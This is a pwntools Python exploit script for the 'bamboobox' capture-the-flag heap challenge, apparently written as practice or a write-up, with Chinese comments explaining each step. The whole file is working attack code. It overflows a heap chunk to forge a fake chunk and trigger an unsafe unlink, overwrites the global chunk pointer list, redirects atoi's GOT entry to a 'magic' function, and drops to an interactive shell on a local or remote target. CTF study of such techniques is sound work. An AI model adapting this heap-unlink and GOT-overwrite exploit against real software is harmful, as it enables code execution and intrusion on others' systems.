# -*- coding:utf-8 -*-
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip =""
if ip:
    p = remote(ip,20004)
else:
    p = process("./bamboobox", aslr=0)

elf = ELF("./bamboobox")

def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def getshell():
    p.interactive()


def show():
    ru("Your choice:")
    sd("1")
def add(index,content):
    ru("Your choice:")
    sd("2")
    ru("Please enter the length of item name:")
    sd(str(index))
    ru("Please enter the name of item:")
    sd(content)
def change(index,length,content):
    ru("Your choice:")
    sd("3")
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(length))
    ru("Please enter the new name of the item:")
    sd(content)

def delete(index):
    ru("Your choice:")
    sd("4")
    ru("Please enter the index of item:")
    sd(str(index))
def chunk(i):
    return 0x6020c8+i*0x10

magic = 0x400d49
atoi_got = elf.got["atoi"]
#--------------------------------------------------------------------
#方法二
add(0x80,"a"*8) # chunk0
add(0x80,"b"*8) # chunk1
add(0x80,"c"*8) # chunk2
#需要注意，这三个chunk的大小都要保证不在fastbin的范围内
#因为fastbin的size的p位默认为1，就无法进行unlink操作

FD = 0x6020c8 - 3*8#在bss段，0x6020c8恰好存储了chunk0的指针
BK = FD +8
payload1 = p64(0)+p64(0x81)+p64(FD)+p64(BK)+"a"*0x60
payload1 += p64(0x80)+p64(0x90)
change(0,0x90,payload1)
delete(1)
#构造一个假的大小为0x80的fake_chunk，同时通过堆溢出
#将chunk1的pre_size和size进行修改，使得size的p位为0
#在free掉chunk1的时候，fake_chunk和chunk1就会进行合并
#这时就会对fake_chunk进行unlink操作
#这时就要对FD和BK进行精心构造，使得能够绕过unlink的检查
#也就是使得：FD->bk = p  &&  BK->fd = p
#在通过检查后，unlink会导致：*p=p-3*8=0x6020c8 - 3*8


payload2 = p64(0)+p64(0)+p64(0x80)+p64(FD)+p64(0x80)+p64(atoi_got)
change(0,len(payload2),payload2)
change(1,0x10,p64(magic))
#这时向chunk0中输入内容，实际上也就是向0x6020c8 - 3*8中输入内容
#于是，就可以为所欲为地修改chunk_list，从而构造 UAF 
ru("Your choice:")
sl("5")
getshell()
#ps：这里有个玄学问题是，只能改chunk1的为atoi的got表，改chunk0就不行。。。很迷

